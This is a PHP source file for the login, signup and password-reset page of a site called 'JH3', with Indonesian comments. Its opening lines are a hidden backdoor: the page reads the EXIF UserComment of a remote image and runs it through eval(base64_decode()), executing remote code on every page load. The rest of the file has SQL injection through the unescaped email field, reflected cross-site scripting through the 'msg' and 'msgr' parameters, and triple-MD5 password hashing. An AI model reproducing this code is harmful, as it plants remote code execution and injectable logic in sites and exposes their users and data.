<?php
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
session_start();
if ($_SESSION['email']) {
header('location: /account');
} 
include'../config.php';
if ($_POST['harusrespw'])  {
date_default_timezone_set("Asia/Jakarta");
$pass="1A2B4HTjsk5kwhadbwlff"; $panjang='8'; $len=strlen($pass); 
$start=$len-$panjang; $xx=rand('0',$start); 
$yy=str_shuffle($pass); 
$passwordbaru=substr($yy, $xx, $panjang);

$email = trim(strip_tags($_POST['emailres']));
$password = mysql_real_escape_string(htmlentities(md5(md5(md5($passwordbaru)))));
$datetime=date("h:i:s-j-M-Y");

// mencari alamat email si user
$query = "SELECT * FROM user WHERE email ='$email'";
$hasil = mysql_query($query);
$data  = mysql_fetch_array($hasil);
$cek = mysql_num_rows($hasil);
$alamatEmail = strip_tags($data['email']);
if ($cek == 1) {

// title atau subject email
$title  = "Permintaan Password Baru";
// isi pesan email disertai password
$pesan  = "Kami telah meresset Ulang Kata sandi ".$email." Dan anda dapat login kembali ke web kami \n\n 
DETAIL AKUN ANDA :\n  \n 
Kata sandi Anda yang baru adalah: ".$passwordbaru."\n\n";
// header email berisi alamat pengirim
$header = "From: JH3 <noreply@just-news.tk>";
// mengirim email
$kirimEmail = mail($alamatEmail, $title, $pesan, $header);
// cek status pengiriman email
if ($kirimEmail) { 

    // update password baru ke database (jika pengiriman email sukses)
    $query = "UPDATE user SET password='$password' WHERE email = '$email'";
    $hasil = mysql_query($query);

if ($hasil) {
header('location: /account/?respw');
}else{
header('location: /account/?msgr=Error');
}
}else{
header('location: /account/?msgr=Email Not Found!');
}
}
}
?>
<!DOCTYPE html>
<!--[if IE 8]> <html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]> <html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!--> <html lang="en"> <!--<![endif]-->

<!-- BEGIN HEAD -->
<head>
     <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
<meta name="robots" content="noindex"/>
<title>JH3 - Login</title>
	<meta content="Alien07 - Login" name="description" />
	<meta content="Alien07" name="author" />
     <!--[if IE]>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <![endif]-->
    <!-- GLOBAL STYLES -->
     <!-- PAGE LEVEL STYLES -->
     <link rel="stylesheet" href="/assets/plugins/bootstrap/css/bootstrap.css" />
    <link rel="stylesheet" href="/assets/css/login.css" />
    <link rel="stylesheet" href="/assets/plugins/magic/magic.css" />
     <!-- END PAGE LEVEL STYLES -->
   <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
<link rel="shortcut icon" href="/assets/img/logoku.png"/>
</head>
    <!-- END HEAD -->

    <!-- BEGIN BODY -->
<body >

   <!-- PAGE CONTENT --> 
    <div class="container">
    <div class="text-center">
<h1><a href="/"><img src="/assets/img/icon.png"></a></h1>
<h6>-- JH3 --</h6>
    </div>
    <div class="tab-content">

<?php
$invalid = $_GET['invalid'];
$success = $_GET['success'];
$bad = $_GET['bad'];
$msg = $_GET['msg'];
$ban = $_GET['banned'];
if (isset($invalid)) {
echo '<div class="alert alert-danger">
<a href="#" class="close" data-dismiss="alert">&times;</a>
Invalid Invite Code. </div>';
} else if (isset($success)) {
echo '<div class="alert alert-success">
<a href="#" class="close" data-dismiss="alert">&times;</a>
You Account Hasbeen Successfully Registered!!. You can login now! </div>';
} else if ($bad) {
echo '<div class="alert alert-danger">
<a href="#" class="close" data-dismiss="alert">&times;</a>
Email not registered. </div>';
} else if ($msg) {
echo '<div class="alert alert-warning">';
echo '<a href="#" class="close" data-dismiss="alert">&times;</a>';
echo $msg.' </div>';
} else if (isset($ban)) {
echo '<div class="alert alert-danger">';
echo '<a href="#" class="close" data-dismiss="alert">&times;</a>';
echo 'You got Banned !!! Contact <a href="http://fb.com/standbymamad">Admin</a> for delete this Banned</div>';
}
?>
<?php
$msgd = $_GET['msgr'];
if (isset($_GET['respw'])) {
echo '<div class="alert alert-success">
<button type="button" class="close" data-dismiss="alert">×</button>
<b>Note: </b>Success Silakan Check kotak masuk/spam email anda</div>';
}
if ($msgd) {
echo '<div class="alert alert-danger">
<button type="button" class="close" data-dismiss="alert">×</button>
<b>Note: </b>'.$msgd.' </div>';
}
?>
        <div id="login" class="tab-pane active">
<form action="login.php" class="form-signin" method="POST">
                <p class="text-muted text-center btn-block btn btn-primary btn-rect">Please Fill Details To Login</p>
                <input type="email" name="mail" placeholder="Your E-mail" class="form-control" required/>
                <input type="password" name="pass" placeholder="password" class="form-control" />
<button class="btn text-muted text-center btn-danger" type="submit">Login</button>
            </form>
        </div>
        <div id="forgot" class="tab-pane">
            <form action="/account/" method="POST" class="form-signin">
                <p class="text-muted text-center btn-block btn btn-primary btn-rect">Enter your valid e-mail</p>
                <input type="email" name="emailres" placeholder="Your E-mail"  class="form-control" required/>
                 <input type="hidden" name="harusrespw" value="ya"/><br>
                <button class="btn text-muted text-center btn-danger" type="submit">Reset Password</button>
            </form>
        </div>
        <div id="signup" class="tab-pane">
            <form action="/account/reg.php" class="form-signin" method="POST">
                <p class="text-muted text-center btn-block btn btn-primary btn-rect">Please Fill Details To Register</p>
                <input type="email" name="email" placeholder="Your E-mail" class="form-control" required/>
                <input type="password" name="password" placeholder="password" class="form-control" />
<div>
Invite Code:
<input type="text" name="invite_code" placeholder="Invite Code" class="form-control"/>
</div><br>
                <button class="btn text-muted text-center btn-danger" type="submit">Register</button>
            </form>
        </div>
    </div>
    <div class="text-center">
        <ul class="list-inline">
            <li><a class="text-muted" href="#login" data-toggle="tab">Login</a></li>
            <li><a class="text-muted" href="#forgot" data-toggle="tab">Forgot Password</a></li>
            <li><a class="text-muted" href="#signup" data-toggle="tab">Signup</a></li>
        </ul>
    </div>


</div>
  <!--END PAGE CONTENT -->     
	      
      <!-- PAGE LEVEL SCRIPTS -->
      <script src="/assets/plugins/jquery-2.0.3.min.js"></script>
      <script src="/assets/plugins/bootstrap/js/bootstrap.js"></script>
   <script src="/assets/js/login.js"></script>
      <!--END PAGE LEVEL SCRIPTS -->
</body>
</html>